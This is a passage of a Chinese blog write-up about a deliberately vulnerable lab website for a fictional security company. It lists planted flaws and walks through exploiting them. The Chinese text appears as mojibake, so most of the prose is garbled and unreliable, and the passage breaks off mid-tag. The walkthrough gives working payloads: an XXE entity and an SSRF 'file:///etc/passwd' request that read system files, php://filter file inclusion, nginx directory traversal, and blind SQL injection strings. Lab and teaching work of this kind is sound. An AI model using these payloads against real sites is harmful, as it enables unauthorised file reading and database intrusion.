çº¯å±è™šæ„ï¼‰ï¼Œå¯¼è‡´è¯¥ç½‘ç«™ä¸­å­˜åœ¨äº†å¾ˆå¤šæ¼æ´ï¼Œæ­¤æ—¶ä¸€ä¸ªä¸å®‰å¥½å¿ƒçš„é»‘å®¢çœ‹ä¸Šäº†è¿™å®¶å®‰å…¨å…¬å¸çš„ç½‘ç«™ã€‚å¯¹è¯¥ç½‘ç«™è¿›è¡Œäº†æ”»å‡»ã€‚</p><p>å…·ä½“åŠŸèƒ½å¦‚ä¸‹ï¼š</p><p>(1).å‰å°å±•ç¤ºé¡µé¢ï¼ŒåŒ…å«å…³äºæˆ‘ä»¬ï¼Œæ–°é—»ä¸­å¿ƒï¼Œè”ç³»æˆ‘ä»¬ä»¥åŠæ„è§åé¦ˆå››ä¸ªæ¨¡å—</p><p>å…¶ä¸­å…³äºæˆ‘ä»¬â€“&gt;å…¬å¸ä¸»é¡µ ä½ç½®å­˜åœ¨SSRFæ¼æ´</p><p>æ„è§åé¦ˆ å­˜åœ¨XXEæ¼æ´</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181531579.png" alt="image-20210408181531579"></p><p>(2).åå°ç®¡ç†å‘˜é¡µé¢ï¼Œåå°ç®¡ç†åŠŸèƒ½ååˆ†ä¸°å¯Œï¼Œå‡ ä¹åŒ…å«æ‰€æœ‰éœ€è¦çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®éœ€è¦è‡ªå®šä¹‰æ¨¡å—å¹¶å®‰è£…ï¼Œå…¶ä¸­çš„çŸ­æ¶ˆæ¯å‘é€å­˜åœ¨XSSæ¼æ´ï¼ŒæŸ¥çœ‹å†…ç½‘ä¸»æœºå’Œphpinfoå­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç®¡ç†ä¼šå‘˜çš„é¡µé¢å­˜åœ¨CSRFæ¼æ´</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181705018.png" alt="image-20210408181705018"></p><p>(3).ç”¨æˆ·æ³¨å†Œä¸ç™»å½•ï¼Œæä¾›ç”¨æˆ·æ³¨å†Œå’Œç™»å½•åŠŸèƒ½ï¼Œç™»å½•åçš„ç”¨æˆ·å¯ä»¥æ ¹æ®æƒé™å‘ä¸åŒçš„æ ç›®æŠ•ç¨¿ï¼Œå‘åˆ«çš„ç”¨æˆ·å‘é€æ¶ˆæ¯ï¼Œæ”¯æŒå¤´åƒæ›´æ¢ï¼Œå¯†ç ä¿®æ”¹ç­‰åŠŸèƒ½ã€‚å…¶ä¸­æŠ•ç¨¿ä½ç½®å­˜åœ¨XSSæ¼æ´å’Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯†ç ä¿®æ”¹ä½ç½®å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421223320698.png" alt="image-20210421223320698"></p><p>(4).åœ¨å‰å°é¡µé¢ä¸­æœ‰ä¸€ä¸ªå•ç‹¬çš„æ¨¡å—ï¼Œå«å…è¯•åŠ å…¥ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªCTFé¢˜ç›®ï¼Œç±»å‹æ—¶unserializeï¼Œå¦‚æœå¯ä»¥è·å–flagï¼Œåˆ™å¯ä»¥è·å–å…è¯•èµ„æ ¼åŠ å…¥å›¢é˜Ÿã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181601058.png" alt="image-20210408181601058" style="zoom:67%;"><h2 id="5-æ¼æ´ä»‹ç»"><a href="#5-æ¼æ´ä»‹ç»" class="headerlink" title="5.æ¼æ´ä»‹ç»"></a>5.æ¼æ´ä»‹ç»</h2><ul><li><p>æœ¬åœ°æ–‡ä»¶åŒ…å«</p><p>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé¡¾åæ€ä¹‰ï¼ŒæŒ‡çš„æ˜¯èƒ½æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œé€ æˆè¿™ä¸ªæ¼æ´çš„å‡½æ•°æœ‰å››ä¸ª<code>include,include_once,require,require_once</code>ã€‚è¯¥æ¼æ´å¯ä»¥ä½¿ç”¨phpä¸ºåè®®php://filterï¼Œè¯»å–phpæ–‡ä»¶çš„æºç ï¼Œåœ¨ä¸€äº›ctfé¢˜ç›®ä¸­å¾ˆå¸¸è§ã€‚</p><p>è¯¥æ¼æ´å­˜åœ¨äºç½‘ç«™é¦–é¡µçš„è”ç³»æˆ‘ä»¬é¡µé¢</p></li><li><p>ssrf</p><p>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å¯¹å†…ç½‘è¿›è¡Œæ‰«ææ¢æµ‹å­˜æ´»çš„ä¸»æœºå’Œç«¯å£ï¼Œè¿›è€Œå¯¹å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚æ­¤å¤–è¯¥æ¼æ´è¿˜ä¼šé€ æˆæ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨file://åè®®+æ–‡ä»¶ç»å¯¹è·¯å¾„å¯ä»¥è·å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚</p><p>æ€»ç»“SSRFé€ æˆçš„å±å®³ï¼š</p><ul><li><p>æ‰«å†…ç½‘</p></li><li><p>å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„Payload</p></li><li><p>DOSæ”»å‡»ï¼ˆè¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥Keep-Alive Alwaysï¼‰</p></li><li><p>æ”»å‡»å†…ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨GETå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚struts2ï¼Œsqliç­‰ï¼‰</p></li><li><p>åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰</p></li></ul><p>æ­¤æ¼æ´å­˜åœ¨è®¿é—®å…¬å¸ä¸»é¡µ</p></li></ul><ul><li><p>xxe</p><p>XXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œä»åå­—å°±èƒ½çœ‹å‡ºæ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªæ³¨å…¥æ¼æ´ï¼Œæ³¨å…¥çš„æ˜¯XMLå¤–éƒ¨å®ä½“ã€‚</p><p>æ­¤æ¼æ´å¯ä»¥å½¢æˆå‘½ä»¤æ‰§è¡Œå’Œæ–‡ä»¶åŒ…å«æ”»å‡»ã€‚</p><p>æ­¤æ¼æ´å­˜åœ¨äºæ„è§åé¦ˆé¡µé¢</p></li></ul><ul><li><p>sqlæ³¨å…¥ â€” åŒ…å«ä¸¤ä¸ªæ¼æ´ç‚¹</p><p>Sql æ³¨å…¥æ”»å‡»æ˜¯é€šè¿‡å°†æ¶æ„çš„ Sql æŸ¥è¯¢æˆ–æ·»åŠ è¯­å¥æ’å…¥åˆ°åº”ç”¨çš„è¾“å…¥å‚æ•°ä¸­ï¼Œå†åœ¨åå° Sql æœåŠ¡å™¨ä¸Šè§£ææ‰§è¡Œè¿›è¡Œçš„æ”»å‡»ï¼Œå®ƒç›®å‰é»‘å®¢å¯¹æ•°æ®åº“è¿›è¡Œæ”»å‡»çš„æœ€å¸¸ç”¨æ‰‹æ®µä¹‹ä¸€ã€‚</p><p>æ­¤æ¼æ´å­˜åœ¨ä¸ç”¨æˆ·ä¿®æ”¹å¯†ç é¡µé¢å’Œç™»å½•ä¿®æ”¹ç¨¿ä»¶é¡µé¢ï¼ŒäºŒè€…éƒ½å¯ä»¥ä½¿ç”¨ç›²æ³¨è¿›è¡Œæ”»å‡»ã€‚</p></li></ul><ul><li><p>æ–‡ä»¶ä¸Šä¼ </p><p>ç½‘ç«™WEBåº”ç”¨éƒ½æœ‰ä¸€äº›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ¯”å¦‚æ–‡æ¡£ã€å›¾ç‰‡ã€å¤´åƒã€è§†é¢‘ä¸Šä¼ ï¼Œå½“ä¸Šä¼ åŠŸèƒ½çš„å®ç°ä»£ç æ²¡æœ‰ä¸¥æ ¼æ ¡éªŒä¸Šä¼ æ–‡ä»¶çš„åç¼€å’Œæ–‡ä»¶ç±»å‹æ—¶ï¼Œå°±å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ç”šè‡³æ˜¯å¯æ‰§è¡Œæ–‡ä»¶åé—¨ã€‚</p><p>æ­¤æ¼æ´å­˜åœ¨äºç”¨æˆ·ä¸Šä¼ å¤´åƒçš„ä½ç½®ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬åå¯ç›´æ¥ä½¿ç”¨èšå‰‘è·å–shell</p></li></ul><ul><li><p>å¼±å£ä»¤</p><p>å¼±å£ä»¤é¡¾åæ€ä¹‰æ˜¯ä½¿ç”¨äº†å®‰å…¨æ€§æ¯”è¾ƒä½ï¼Œå¹¶ä¸”æ¯”è¾ƒå¸¸è§çš„çŸ­å­—ç¬¦ä½œä¸ºå¯†ç </p><p>æ­¤æ¼æ´å­˜åœ¨äºç®¡ç†å‘˜å¯†ç ï¼Œè¿™æ˜¯å¾ˆå¸¸è§ä½†åˆå¾ˆå±é™©çš„ä¸€ä¸ªæ¼æ´</p></li></ul><ul><li><p>xss       â€” åŒ…å«ä¸¤ä¸ªæ¼æ´ç‚¹</p><p>xsså°±æ˜¯æ”»å‡»è€…åœ¨webé¡µé¢æ’å…¥æ¶æ„çš„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚æ”»å‡»è¿™å¯ä»¥ä½¿ç”¨xssè·å–å¤„äºç™»å½•çŠ¶æ€çš„ç”¨æˆ·cookieï¼Œä»è€Œå¯ä»¥æ— å¯†ç ç™»å½•è´¦å·ã€‚</p><p>æ­¤æ¼æ´å­˜åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯ç”¨æˆ·æŠ•ç¨¿ï¼Œä¸€ä¸ªç”¨æˆ·å‘é€çŸ­æ¶ˆæ¯</p></li></ul><ul><li><p>rce</p><p>æ˜¯æŒ‡ç”¨æˆ·é€šè¿‡æµè§ˆå™¨æäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ï¼Œå¯èƒ½ä¼šå…è®¸æ”»å‡»è€…é€šè¿‡æ”¹å˜ $PATH æˆ–ç¨‹åºæ‰§è¡Œç¯å¢ƒçš„å…¶ä»–æ–¹é¢æ¥æ‰§è¡Œä¸€ä¸ªæ¶æ„æ„é€ çš„ä»£ç ã€‚</p><p>æ­¤æ¼æ´å­˜åœ¨äºåå°ç®¡ç†é¡µé¢ä¸­çš„ä¿¡æ¯é‡‡é›†â€“&gt;æŸ¥çœ‹å†…ç½‘ä¸»æœº</p></li><li><p>ä»»æ„æ–‡ä»¶ä¸‹è½½</p><p>éæ³•ä¸‹è½½æœåŠ¡å™¨ä¸Šå­˜åœ¨çš„èµ„æº</p></li><li><p>csrf</p><p>è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  ï¼Œ è·ŸXSSæ”»å‡»ä¸€æ ·ï¼Œå­˜åœ¨å·¨å¤§çš„å±å®³æ€§ ã€‚åˆ©ç”¨csrfï¼Œæ”»å‡»è€…å¯ä»¥ç›—ç”¨ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚ ä½ çš„åä¹‰å‘é€é‚®ä»¶ã€å‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œæ·»åŠ ç³»ç»Ÿç®¡ç†å‘˜ï¼Œç”šè‡³äºè´­ä¹°å•†å“ã€è™šæ‹Ÿè´§å¸è½¬è´¦ç­‰ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210321220650619.png" alt="image-20210321220650619" style="zoom:50%;"></li></ul><ul><li><p>ååºåˆ—åŒ–  </p><p>ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ˜¯æŒ‡ç½‘ç«™å¯¹ç”¨æˆ·å¯æ§åˆ¶çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œæ”»å‡»è€…èƒ½å¤Ÿæ“çºµåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œä»¥å°†æœ‰å®³æ•°æ®ä¼ é€’åˆ°åº”ç”¨ç¨‹åºä»£ç ä¸­ã€‚ç”šè‡³æœ‰å¯èƒ½ç”¨å®Œå…¨ä¸åŒç±»çš„å¯¹è±¡æ›¿æ¢åºåˆ—åŒ–çš„å¯¹è±¡ã€‚æ›´å¤¸å¼ çš„æ˜¯ï¼Œå°†å¯¹ç½‘ç«™å¯ç”¨çš„ä»»ä½•ç±»åˆ«çš„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–å’Œå®ä¾‹åŒ–ï¼Œè€Œä¸é¢„æœŸçš„ç±»åˆ«æ— å…³ã€‚å› æ­¤ï¼Œä¸å®‰å…¨çš„ååºåˆ—åŒ–æœ‰æ—¶ç§°ä¸ºâ€œå¯¹è±¡æ³¨å…¥â€æ¼æ´</p><p>æ­¤æ¼æ´å­˜åœ¨å…è¯•åŠ å…¥æˆ‘ä»¬çš„é¡µé¢ï¼ŒæˆåŠŸè€…å¯ä»¥è·å¾—ä¸€ä¸ªflagã€‚</p></li></ul><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>æ¸—é€æµ‹è¯•æµç¨‹</p><p><img src="/2021/03/21/mycms/Users/Sunzh/Desktop/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%AE%9E%E8%B7%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.png" alt="ç½‘ç»œæ”»å‡»ä¸é˜²å¾¡å®è·µæ¸—é€æµ‹è¯•æµç¨‹"></p><h2 id="1-RFI"><a href="#1-RFI" class="headerlink" title="1.RFI"></a>1.RFI</h2><p>é¦–å…ˆç‚¹å‡»é¦–é¡µçš„æœ€ä¸‹é¢â€œä¼˜ç§€å‘˜å·¥â€ï¼Œå¯ä»¥å‘ç°URLçš„å˜åŒ–ï¼Œçœ‹åˆ°æœ€åæœ‰ä¸€ä¸ªfileå‚æ•°ï¼ŒçŒœæµ‹è¯¥é¡µé¢çš„ä¸€äº›å‚æ•°æ˜¯ä»<code>info.php</code>ä¸­è·å–çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªä½ç½®å°±åº”è¯¥æ˜¯ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶åŒ…å«ã€‚å°è¯•å°†info.phpæ¢æˆå…¶ä»–çš„æ–‡ä»¶åï¼Œå‘ç°é¡µé¢ä¸­çš„ä¸€äº›å†…å®¹æ¶ˆå¤±äº†ï¼Œè¯´æ˜è¿™é‡Œå°±æ˜¯ç”¨äº†æ–‡ä»¶åŒ…å«ã€‚</p><p>é‚£ä¹ˆå¦‚æœæ²¡æœ‰å¯¹è¯¥å‚æ•°è¿›è¡Œè¿‡æ»¤æˆ–è€…å…¶ä»–çš„é™åˆ¶çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨<code>php://filter</code>åè®®è¯»å–åˆ°phpæ–‡ä»¶çš„base64æºç ï¼Œ</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210401101403284.png" alt="image-20210401101403284"></p><p>æˆ–è€…ç›´æ¥è¯»å–æ“ä½œç³»ç»Ÿä¸­çš„ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œå¦‚<code>/etc/passwd</code>ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210401101335296.png" alt="image-20210401101335296"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹fileåè®®è¿‡æ»¤ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ä¸€äº›å¸¸ç”¨çš„æ–‡ä»¶è·¯å¾„è·å–åˆ°æ•æ„Ÿæ–‡ä»¶</p><h2 id="2-XXE"><a href="#2-XXE" class="headerlink" title="2.XXE"></a>2.XXE</h2><p>æ³¨å…¥XMLæ–‡ä»¶ä¸­ï¼Œä¸€æ—¦æ–‡ä»¶è¢«æ‰§è¡Œï¼Œå°†ä¼šè¯»å–æœåŠ¡å™¨ä¸Šçš„æœ¬åœ°æ–‡ä»¶ï¼Œå¹¶å¯¹å†…ç½‘å‘èµ·è®¿é—®æ‰«æå†…éƒ¨ç½‘ç»œç«¯å£ã€‚æ¢è€Œè¨€ä¹‹ï¼ŒXXEæ˜¯ä¸€ç§ä»æœ¬åœ°åˆ°è¾¾å„ç§æœåŠ¡çš„æ–¹æ³•ã€‚æ­¤å¤–ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šè¿™ä¹Ÿå¯èƒ½å¸®åŠ©æ”»å‡»è€…ç»•è¿‡é˜²ç«å¢™è§„åˆ™è¿‡æ»¤æˆ–èº«ä»½éªŒè¯æ£€æŸ¥ã€‚</p><p>xxeæ¼æ´å­˜åœ¨äºæ„è§åé¦ˆé¡µé¢ï¼Œä½¿ç”¨BpæŠ“åŒ…å¯ä»¥çœ‹åˆ°ï¼Œæäº¤çš„å‚æ•°æ˜¯xmlæ ¼å¼ï¼Œæäº¤æˆåŠŸåä¼šè¿”å›ä¸€ä¸ªæç¤ºä¿¡æ¯<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322094353064.png" alt="image-20210322094353064"></p><p>æ—¢ç„¶å‚æ•°æ˜¯ä»¥xmlæ ¼å¼æäº¤çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ å‡ºä¸€ä¸ªå¤–éƒ¨å®ä½“æ³¨å…¥å…¶ä¸­ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æˆ–è€…å‘½ä»¤æ‰§è¡Œã€‚</p><p>ä½¿ç”¨payloadè¯»å–<code>/etc/passwd</code>æ–‡ä»¶</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;info&gt;as&lt;&#x2F;info&gt;&lt;&#x2F;user&gt;</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322095014823.png" alt="image-20210322095014823"></p><h2 id="3-SSRF"><a href="#3-SSRF" class="headerlink" title="3.SSRF"></a>3.SSRF</h2><p>å½“è®¿é—®å…¬å¸ä¸»é¡µè¿™ä¸ªé¡µé¢æ—¶ä¼šå‘ç°urlå‘ç”Ÿå˜åŒ–ï¼Œå¹¶è·³è½¬åˆ°å¦ä¸€é¡µé¢</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192059989.png" alt="image-20210322192059989" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192116225.png" alt="image-20210322192116225" style="zoom:67%;"><p>è¿™é‡Œæ˜¯è·³è½¬åˆ°äº†æˆ‘çš„åšå®¢é¡µé¢ï¼Œä½†æ˜¯å¯èƒ½ç”±äºç¼ºå°‘æ¸²æŸ“ï¼Œæ˜¾ç¤ºä¸æ­£å¸¸ï¼Œå°è¯•è®¿é—®ç™¾åº¦ï¼Œgetæäº¤</p><pre><code class="hljs awk">?url=https:<span class="hljs-regexp">//</span>www.baidu.com</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192303582.png" alt="image-20210322192303582"></p><p>å¯ä»¥å‘ç°æˆåŠŸè·³è½¬åˆ°äº†ç™¾åº¦çš„é¡µé¢ï¼ŒçŒœæµ‹æˆ‘ä»¬æäº¤çš„urlå‚æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤å°±ç›´æ¥å¸¦å…¥åˆ°å‡½æ•°ä¸­æ‰§è¡Œã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨<code>file://</code>åè®®è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œä½¿ç”¨payload:<code>?url=file:///etc/passwd</code>ï¼ŒæˆåŠŸè¯»å–åˆ°æ–‡ä»¶å†…å®¹ï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192737122.png" alt="image-20210322192737122"></p><h2 id="4-ç›®å½•éå†"><a href="#4-ç›®å½•éå†" class="headerlink" title="4.ç›®å½•éå†"></a>4.ç›®å½•éå†</h2><p>åœ¨æµè§ˆå™¨ä¸­æŒ‰F12ï¼Œåœ¨networkä¸­æŸ¥çœ‹å“åº”å¤´ï¼Œå¯ä»¥å‘ç°å­˜åœ¨serverå­—æ®µï¼Œè¿™æ˜¯ç½‘ç«™ä½¿ç”¨çš„æœåŠ¡å™¨ä»¥åŠç‰ˆæœ¬ä¿¡æ¯ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯nginx</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414192735246.png" alt="image-20210414192735246" style="zoom:50%;"><p>è€Œnginxå­˜åœ¨ä¸€ä¸ªå¾ˆå¸¸è§çš„æ¼æ´â€”é…ç½®ä¸å½“å¯¼è‡´çš„ç›®å½•ç©¿è¶Šæ¼æ´</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414193433871.png" alt="image-20210414193433871" style="zoom:67%;"><p>è¿›è¡Œæ”»å‡»</p><p>å°è¯•è®¿é—®<code>http://192.168.164.147/files/</code>ï¼Œå‡ºç°äº†<code>images</code>æ–‡ä»¶å¤¹ï¼Œè¿™åº”è¯¥ç½‘ç«™ä¿å­˜ä¸Šä¼ å›¾ç‰‡çš„ä½ç½®</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414193646247.png" alt="image-20210414193646247"></p><p>è¾“å…¥<code>http://192.168.164.147/files../</code>çœ‹åˆ°äº†ç½‘ç«™çš„æ ¹ç›®å½•ä¸­çš„å†…å®¹ï¼Œç‚¹å‡»å¯ä»¥å°†éƒ¨åˆ†æ–‡ä»¶ä¸‹è½½ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414194304371.png" alt="image-20210414194304371" style="zoom: 50%;"><h2 id="5-SQLæ³¨å…¥ï¼ˆ4ä¸ªï¼‰"><a href="#5-SQLæ³¨å…¥ï¼ˆ4ä¸ªï¼‰" class="headerlink" title="5.SQLæ³¨å…¥ï¼ˆ4ä¸ªï¼‰"></a>5.SQLæ³¨å…¥ï¼ˆ4ä¸ªï¼‰</h2><h3 id="æ¼æ´ç‚¹ä¸€"><a href="#æ¼æ´ç‚¹ä¸€" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a>æ¼æ´ç‚¹ä¸€</h3><p>ç¬¬ä¸€ä¸ªsqlæ³¨å…¥æ¼æ´ç‚¹åœ¨ç”¨æˆ·ç™»å½•é¡µé¢ï¼Œå­˜åœ¨ä¸€ä¸ªä¿®æ”¹å¯†ç åŠŸèƒ½ï¼Œå…ˆæ³¨å†Œæœ‰ä¸€ä¸ªç”¨æˆ·ï¼Œå°è¯•ä¿®æ”¹å¯†ç ï¼ŒçŒœæµ‹å…¶å·¥ä½œæœºåˆ¶ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193046802.png" alt="image-20210322193046802" style="zoom:67%;"><p>ç¬¬ä¸€æ¬¡å°è¯•è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·åï¼Œè¿”å›ä¿¡æ¯æ˜¯<code>no user!</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193527184.png" alt="image-20210322193527184"></p><p>ç¬¬äºŒæ¬¡è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åé”™è¯¯çš„å¯†ç ï¼Œæç¤º<code>wrong password!</code>ï¼Œè¿™ä¸ªé€»è¾‘å¾ˆæ­£å¸¸</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193635551.png" alt="image-20210322193635551"></p><p>ç¬¬ä¸‰æ¬¡è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œä¸¤ä¸ªä¸ä¸€æ ·çš„æ–°å¯†ç ï¼Œæç¤º<code>new password are different!</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193733391.png" alt="image-20210322193733391"></p><p>è¿™ä¸Šé¢çš„ä¸‰ç§æƒ…å†µæ˜¯ä¿®æ”¹å¯†ç æ—¶å¸¸è§çš„æƒ…å†µï¼Œçœ‹ä¼¼éƒ½å¯ä»¥æ­£å¸¸çš„å·¥ä½œï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰å¯¹ç”¨æˆ·åè¿™ä¸ªå‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤çš„è¯å°±å¯ä»¥é€ æˆç›²æ³¨çš„æ¼æ´ã€‚</p><p>å› ä¸ºå½“æˆ‘ä»¬æäº¤å®Œå‚æ•°åï¼ŒæœåŠ¡å™¨è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯å»æ•°æ®åº“ç§æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¯¥ç”¨æˆ·åï¼Œè‹¥ä¸å­˜åœ¨åˆ™è¿”å›<code>no user!</code>ï¼Œè‹¥å­˜åœ¨çš„è¯ä¸”è¾“å…¥çš„ä¸¤æ¬¡æ–°å¯†ç éƒ½æ­£ç¡®ä½†æ˜¯æ—§å¯†ç é”™è¯¯ï¼Œå°±ä¼šæç¤ºç”¨æˆ·<code>wrong password!</code>ï¼Œè¿™ä¹Ÿæ˜¯é€ æˆç›²æ³¨çš„é‡è¦åŸå› ã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·åå’Œå¯†ç åˆ†åˆ«ä¸º<code>szy</code>å’Œ<code>admin</code>ï¼Œä½†æ˜¯æˆ‘ä»¬æäº¤æ—¶æ„é€ å‡ºå¦‚ä¸‹çš„è¯­å¥</p><pre><code class="hljs apache"><span class="hljs-attribute">account</span>=szy&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span><span class="hljs-attribute">account</span>=szy&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>#&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194605601.png" alt="image-20210322194605601"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194635676.png" alt="image-20210322194635676"></p><p>çœ‹åˆ°ä»¥ä¸Šçš„ç»“æœæˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­ä¸€å®šå­˜åœ¨æ³¨å…¥ã€‚</p><p>æ„é€ payload</p><pre><code class="hljs apache"><span class="hljs-attribute">account</span>=szy&#x27; and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span> #&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span></code></pre><p><img 